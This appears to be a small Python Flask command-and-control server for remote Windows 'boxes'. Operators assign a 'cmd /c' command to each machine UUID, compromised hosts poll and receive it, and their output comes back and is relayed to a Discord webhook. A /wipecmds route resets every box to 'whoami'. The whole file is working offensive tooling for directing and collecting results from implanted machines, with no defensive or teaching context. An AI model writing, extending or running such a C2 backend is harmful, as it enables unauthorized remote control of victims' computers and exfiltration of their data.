import os

import flask
import requests

app = flask.Flask(__name__)

cmd = "whoami"
nonce = 0
uuiddict = {None: cmd}


@app.route('/')
def index():
    global cmd
    global nonce
    global uuiddict
    uuid = flask.request.args.get("uuid")
    cmdtest = flask.request.args.get('cmd')
    result = flask.request.args.get('result')
    out = os.getenv("DISCORDAPIKEY")

    if cmdtest is not None:
        uuiddict[uuid] = cmdtest
        nonce += 1
        return f"command successfully set to {uuiddict[uuid]}"
    if result is not None:
        print(result)
        resp = requests.post(out, json={"content": result})
        print(resp.text)
        return ""
    else:
        try:
            return f"cmd /c \"{uuiddict[uuid]}\" && echo \"nonce={nonce}\""
        except KeyError:
            return f"cmd /c \"{uuiddict[None]}\" && echo \"nonce={nonce}\""


@app.route('/wipecmds')
def wipe():
    global cmd
    global uuiddict
    uuiddict = {None: cmd}
    return f"wiped specific cmds, all boxes now run {cmd}"


app.run("0.0.0.0", 14205)
